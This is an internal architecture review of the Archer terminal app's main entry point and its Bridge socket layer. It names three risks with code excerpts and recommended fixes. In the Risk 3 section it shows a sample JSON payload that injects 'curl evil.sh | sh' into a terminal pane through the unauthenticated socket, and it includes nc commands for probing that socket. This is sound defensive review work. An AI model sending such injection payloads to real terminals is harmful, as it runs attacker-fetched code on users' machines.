# Architecture Review: Main Entry Point — Top 3 Risks

**Scope:** `Sources/Archer/main.swift` → `AppDelegate.swift` → Bridge layer  
**Date:** 2026-06-29

---

## Context

The entry point (`main.swift`, 8 lines) immediately hands control to `AppDelegate`
(1,135 lines, `@MainActor`). The last major addition — the Bridge layer
(`BridgeServer` + `PaneRegistry` + `archer-bridge` CLI) — was shipped in the P0
commit and now forms a permanent part of the launch sequence. This review
identifies the three highest-severity architectural risks in that stack.

---

## Risk 1 — BridgeServer blocks the main thread on every command

**Severity: High (user-visible UI freeze)**

**Where:** `Sources/ArcherKit/Bridge/BridgeServer.swift:80-94`

```swift
// AppDelegate sets up the DispatchSource on .main:
let src = DispatchSource.makeReadSource(fileDescriptor: fd, queue: .main)
src.setEventHandler { [weak self] in self?.acceptOne() }

// acceptOne() runs entirely on the main queue:
private func acceptOne() {
    let clientFd = accept(listenFd, nil, nil)
    defer { close(clientFd) }

    var buf = [UInt8](repeating: 0, count: 65536)
    // ⚠️ Synchronous blocking read on the main thread:
    let n = buf.withUnsafeMutableBufferPointer { read(clientFd, $0.baseAddress, $0.count) }
    ...
}
```

`DispatchSource.makeReadSource` fires the event handler only when the *listening
fd* is readable (i.e., a new connection is waiting). That prevents blocking on
`accept()`. But once a client fd is accepted, `read()` is called synchronously on
the main queue with no timeout. If the CLI client sends data slowly, is killed
mid-write, or never closes the connection, the main run loop stalls — the entire
app UI freezes until the kernel times out or the process is killed.

The 64 KB fixed buffer (`[UInt8](repeating: 0, count: 65536)`) is a secondary
risk: any single JSON command larger than 65,536 bytes is silently truncated,
producing invalid JSON that is discarded with no error propagated to the caller.

**Recommended fix:** Move client I/O to a background queue. The simplest approach
is a dedicated `DispatchQueue(label: "bridge.client")` for `read()`/`write()`,
then `DispatchQueue.main.async` back to call `handle()` (which needs
`@MainActor` for `PaneRegistry` access). Alternatively, adopt `async`/`await`
with `FileHandle.readToEnd` so Swift Concurrency handles the context switch.

---

## Risk 2 — BridgeServer is pinned to the first window; multi-window use is broken

**Severity: High (silent wrong-window behavior)**

**Where:** `Sources/ArcherKit/App/AppDelegate.swift:57-60, 119`

```swift
// Lazy init always captures windowControllers.first:
private lazy var bridgeServer: BridgeServer = {
    let srv = BridgeServer()
    srv.store = windowControllers.first?.store   // snapshot of first window
    return srv
}()

// applicationDidFinishLaunching also pins to first window:
bridgeServer.store = windowControllers.first?.store
```

`PaneRegistry.shared.sync(workspace: store?.active)` is called on every bridge
command (BridgeServer.swift:102). Since `store` is always the *first* restored
window's store, the registry only reflects panes visible in that window,
regardless of which window the user is actively working in.

Consequences:

- `archer-bridge list` returns panes from the first window even if the user is
  working in window #2 or #3.
- If the first window is closed, `store` becomes a dangling weak reference → `nil`
  → `PaneRegistry` clears itself → all bridge commands fail with "label not found".
- `archer-bridge type` injects keystrokes into panes the user isn't watching,
  producing silent wrong-pane execution.

The `HookServer`, by contrast, correctly broadcasts to *all* windows
(`for controller in self.windowControllers`). Bridge should follow the same
pattern — or track the key window (`lastKeyController`) rather than the first.

**Recommended fix:** Replace the single `weak var store` with a provider closure
mirroring `AgentMonitor.shared.storesProvider`:

```swift
var activeStoreProvider: (() -> WorkspaceStore?)? = nil
// In AppDelegate:
bridgeServer.activeStoreProvider = { [weak self] in self?.activeStore }
// In BridgeServer.handle():
PaneRegistry.shared.sync(workspace: activeStoreProvider?()?.active)
```

---

## Risk 3 — BridgeServer is unauthenticated; any local process can inject keystrokes

**Severity: High (local code execution via terminal injection)**

**Where:** `Sources/ArcherKit/Bridge/BridgeServer.swift` (entire file)

The socket at `~/.archer/bridge.sock` has no authentication layer. Any process
running as the same user can:

1. Connect to the socket.
2. Send `{"cmd":"type","label":"claude","text":"curl evil.sh | sh\n"}`.
3. Execute arbitrary commands in any open Archer terminal pane.

This is a local privilege escalation vector. It is particularly relevant because:

- Archer is explicitly designed for AI agent integration; agents often run
  untrusted code fetched from the network.
- The `type` and `keys` commands inject input directly into the libghostty
  surface — they are indistinguishable from keyboard input.
- There is no rate limiting, no command allowlist, and no audit log.

Unix socket filesystem permissions (mode 0600, same-user) are the *only*
barrier. That's appropriate for `HookServer` (which only receives read-only
telemetry events), but `BridgeServer` is a bidirectional command channel that can
*write* into terminals.

**Recommended fix (layered defense):**

1. **Short-lived token in socket path or first handshake:** Generate a random
   token at app launch, write it to `~/.archer/bridge.token` (mode 0600), and
   require it as the first field in every request:
   `{"token":"<uuid>","cmd":"type",...}`. The CLI reads the token file before
   connecting.
2. **Command allowlist:** Restrict `type` and `keys` to an explicit opt-in flag
   set at launch (e.g., `--allow-input-injection`), defaulting to read-only
   (`list`, `read`, `sync` only).
3. **Audit log:** Log every non-read command through `ArcherLogger.bridge` at
   `.default` or higher so the user can see what was injected.

---

## Summary Table

| # | Risk | File | Severity | Impact |
|---|------|------|----------|--------|
| 1 | Synchronous `read()` on main thread | `BridgeServer.swift:86` | High | UI freeze on slow/hung client |
| 2 | `store` pinned to first window | `AppDelegate.swift:119` | High | Wrong-window commands, nil-store failures |
| 3 | Zero-auth socket allows keystroke injection | `BridgeServer.swift` (all) | High | Local code execution via any same-user process |

---

## What is NOT a risk (for completeness)

- **`LibghosttyApp.shared` silent init failure:** Logged as `.fault` but gracefully
  continues; surfaces fail to render rather than crashing, which is acceptable.
- **`AppDelegate` 1,135-line length:** Dense but well-structured; each method is
  focused. Refactoring is a quality-of-life item, not a risk.
- **Persistence debounce race on ⌘Q:** The `applicationWillTerminate` force-flush
  exists and uses atomic temp-file writes; the risk is theoretical.

---

## Verification

To confirm Risk 1 (main-thread block): connect a slow client from the shell and
observe the app UI freeze:

```sh
nc -U ~/.archer/bridge.sock &
# (don't send data — just hold the connection)
# Try to click or type in any Archer pane → UI is unresponsive
```

To confirm Risk 2 (wrong-window): open two Archer windows, work in window 2, run:

```sh
archer-bridge list   # should show window-2 panes; will show window-1 panes
```

To confirm Risk 3 (no auth): from any terminal:

```sh
echo '{"cmd":"list"}' | nc -U ~/.archer/bridge.sock
# Returns labels without any token requirement
```
